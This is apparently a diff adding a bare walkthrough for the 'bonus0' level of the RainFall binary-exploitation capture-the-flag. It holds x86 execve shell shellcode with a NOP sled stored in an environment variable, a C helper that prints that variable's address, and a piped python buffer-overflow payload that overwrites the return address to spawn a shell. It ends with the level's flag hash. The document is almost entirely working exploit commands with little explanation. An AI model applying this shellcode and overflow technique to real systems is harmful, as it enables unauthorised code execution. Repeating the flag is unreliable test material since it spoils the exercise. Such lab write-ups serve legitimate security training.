@@ -1,0 +1,25 @@
+bonus0@RainFall:~$ export SHELLCODE=$'\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
+
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **av)
+{
+    if (argc < 2)
+        exit(1);
+    printf("Address for %s is %p\n", av[1], getenv(av[1]));
+}
+
+gcc /tmp/code.c -o /tmp/getenv
+
+bonus0@RainFall:~$ /tmp/getenv SHELLCODE
+Address for SHELLCODE is 0xbffff888
+
+\xbf\xff\xf8\x88
+\x88\xf8\xff\xbf
+
+bonus0@RainFall:~$ (python -c 'print ("\x90" * 4000)' ; python -c 'print ("A" * 9 + "\x88\xf8\xff\xbf" +"B" * 7)' ; cat - ) | ./bonus0 
+
+
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
